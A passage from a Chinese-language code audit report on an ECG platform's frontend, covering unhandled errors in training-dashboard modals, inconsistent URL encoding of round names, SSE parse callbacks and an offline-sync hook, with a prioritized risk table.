  - 当前**没有生产调用方**,只作为共享 hook 风险;但 CLAUDE.md 标"offlineQueue hook 未接 executor",本轮仍未解决。
- **复现**:
  ```ts
  const { syncNow, addPendingAction } = useOfflineMode();
  addPendingAction({ id: '1', type: 'create', data: {...}, timestamp: Date.now() });
  // → localStorage ecg_platform_pending_actions 增加
  await syncNow();
  // → 全部 action.retryCount = 1, lastError = 'No sync handler configured for create'
  // → pendingActions 数量不变(remaining savePendingActions)
  ```
- **修复方向**:
  - 让 useOfflineMode 接受 `executors: PendingActionExecutors` 入参
  - 或拆 publish/subscribe,让具体业务模块(如 createPatient)自行订阅 `online` 事件并重放

---

## 7. TrainingDashboard / TrainingCharts / ParamStats

### 7.1 [P2] 详情弹窗三段失败只 console.error,用户看不到 (C-20)

- **文件:行号**: `src/pages/TrainingDashboard.tsx:170-178`, `src/pages/components/trainingRoundDetails.ts:28-37`
- **证据**:
  ```tsx
  // TrainingDashboard.tsx:170-178
  useEffect(() => {
    if (!round) return;
    loadTrainingRoundDetails(round.round, trainingApi)
      .then((details) => {
        setEpochs(details.epochs);
        setEvalData(details.evalData);
        setParamHistory(details.paramHistory);
      })
      .catch(console.error);  // ← 只 console
  }, [round]);
  ```
  ```ts
  // trainingRoundDetails.ts:26-37
  const missing: TrainingRoundDetails['missing'] = [];
  if (logResult.status === 'rejected') missing.push('log');
  if (evalResult.status === 'rejected') missing.push('eval');
  if (paramResult.status === 'rejected') missing.push('paramStats');
  ```
  - `missing` 已经计算但**没有用**;`TrainingCharts / ParamStatsPanel` 弹窗里全显示"暂无数据"占位。
- **问题**:
  - 一段失败时 `then` 仍执行(因为 `Promise.allSettled` 不抛),**catch 永远不进**;所以 `.catch(console.error)` 是死代码。
  - 用户看到弹窗:曲线 tab 空、参数 tab 空、评估 tab 空,**不知道是文件不存在还是网络问题**。
- **修复方向**:
  - 详情弹窗加 `Alert` 显示 `missing` 列表
  - 把 `missing` 暴露在 `trainingRoundDetails` 返回值,前端在 `Description` 顶部提示

### 7.2 [P2] getHistoryLog/Eval/ParamStats round 名未 encode,合同不一致 (C-21)

- **文件:行号**: `src/services/trainingApi.ts:259-275`
- **证据**:
  ```ts
  // trainingApi.ts:259-263 (log)
  export async function getHistoryLog(round: string): Promise<{ round: string; epochs: EpochData[] }> {
    const res = await fetch(`${API_BASE}/api/training/history/${round}/log`);
    ...
  }
  // trainingApi.ts:265-269 (eval)
  export async function getHistoryEval(round: string): Promise<EvaluationData> {
    const res = await fetch(`${API_BASE}/api/training/history/${round}/eval`);
    ...
  }
  // trainingApi.ts:271-275 (param-stats)
  export async function getHistoryParamStats(round: string): Promise<ParamHistory | null> {
    const res = await fetch(`${API_BASE}/api/training/history/${round}/param-stats`);
    ...
  }
  ```
- **问题**:
  - 与同一文件 `deleteTrainingRound` (`trainingApi.ts:345-356`) 用 `encodeURIComponent(round)` 不一致。
  - round 名含空格、点号、其它特殊字符的 CPSC2018 路径(如 `cpsc2018_binary_v2 focal mixup tta`)会:
    - `getHistoryLog` → path 直接拼 → 后端 404
    - `deleteTrainingRound` → encode → 成功
  - 后端 FastAPI path parameter 对 URL encoding 是双向透明的:`/history/cpsc...{space}...` 后端可能仍 path-match(因为 Starlette 自动 decode),但**前端→后端链路** 先 encode 与否行为有差。
- **复现**:
  ```bash
  curl 'http://localhost:6090/api/training/history/cpsc with space/log'
  # Starlette 收到 raw 'cpsc with space',不存在的 round 但路径合法
  curl 'http://localhost:6090/api/training/history/cpsc%20with%20space/log'
  # 同上,但 URL 编码更标准
  ```
- **修复方向**: 把 `encodeURIComponent` 加到所有 `getHistory*` 函数,与 `deleteTrainingRound` 对齐。

### 7.3 [P2] SSE parse 失败回调语义不清 (C-22)

- **文件:行号**: `src/services/trainingApi.ts:244-250, 285-300, 310-324`
- **证据**:
  ```ts
  // trainingApi.ts:244-250
  export function parseTrainingStreamEvent<T>(event: MessageEvent): T | null {
    try {
      return JSON.parse(event.data) as T;
    } catch {
      return null;
    }
  }
  ```
  ```ts
  // trainingApi.ts:296-298
  es.addEventListener('state_update', (e) => {
    const state = parseTrainingStreamEvent<TrainingState>(e);
    if (state) {
      onMessage(state);
      return;
    }
    onError?.(new Event('parse_error'));   // ← 故意 Event 对象,不是 Error
  });
  ```
- **问题**:
  - `parse_error` 不是天然事件类型,后端**永远不会发**(它发 `state_update` + JSON body),所以这段是当后端返回 `data: "ping"` 或多行 SSE 时触发。
  - `onError` 接 `Event`,前端可能要读 `event.target` / `event.type` 区分,但实际只是占位。
  - 当前没有 UI 处理这个回调(EventSource.onerror 也设了,Vue/React 通常会双重触发 `'error'`)。
- **修复方向**:
  - `parseTrainingStreamEvent` 失败时 console.warn,不假装成 Error 事件
  - 或删除 onError 参数,统一用 `es.onerror`

---

## 8. 风险综合排序(只读,不改代码)

| 优先级 | 编号 | 主题 |
|--------|------|------|
| 必修(P0) | **C-12** | MiniMax analyzeViaProxy `/api/ecg/analyze` 在默认部署不可达 |
| 必修(P1) | **C-11** | 直连分支 SSRF + API key 外发(R-16 残留 + 加固) |
| 必修(P1) | **C-06** | RAG fallback 在仓库内创建文件 |
| 必修(P1) | **C-07** | Assistant error response 暴露绝对路径 |
| 必修(P1) | **C-14** | HL7 parser R-05 残留 |
| 必修(P1) | **C-15** | WFDB 路径未接入 `parseECG` |
| 必修(P1) | **C-19** | useOfflineMode.syncNow 用空 executor |
| 应修(P2) | C-09 | R-19 `/:/` 残留 |
| 应修(P2) | C-10 | GitHub URL 拉取无 MIME 校验 |
| 应修(P2) | C-08 | Assistant 错误丢失根因 |
| 应修(P2) | C-13 | MiniMax 默认 model 弃用风险 |
| 应修(P2) | C-16 | httpClient 默认无超时 |
| 应修(P2) | C-17 | httpClient fallback 5xx 不一致 |
| 应修(P2) | C-18 | offlineQueue 无 retry 上限 |
| 应修(P2) | C-20 | TrainingDashboard 详情失败可观测性 |
| 应修(P2) | C-21 | TrainingApi 路径 encode 不一致 |
| 应修(P2) | C-22 | SSE parse 回调语义 |
| 后续(P3) | — | 代码卫生(单测薄包装等,见 Track A 末尾) |

---

## 9. 与前置审计的差异

- AUDIT-2026-07-04 中 R-05 / R-16 / R-19 的状态:
  - **R-05** 完全未修 → C-14
  - **R-16** 完全未修 → C-11
  - **R-19** 完全未修 → C-09
- 本轮**新增** 11 条 P2 / 1 条 P1 / 1 条 P0:
  - C-06 / C-07 是 Assistant 后端的硬性问题,是 R-05 / R-16 之外的新发现
  - C-08 是接口层的可观测性短板
  - C-10 是 R-19 之外实际更可怕的 fallback
  - C-12 是 R-16 之外的**基础设施级 bug**(谁也没修过 proxy 路由)
  - C-13 是配置层风险
  - C-15 是 wfdb 路径断了,Track A 的 A-05 是 hl7 path 平行问题
  - C-16..C-22 是调用层与 UI 层一致性问题

---

完。
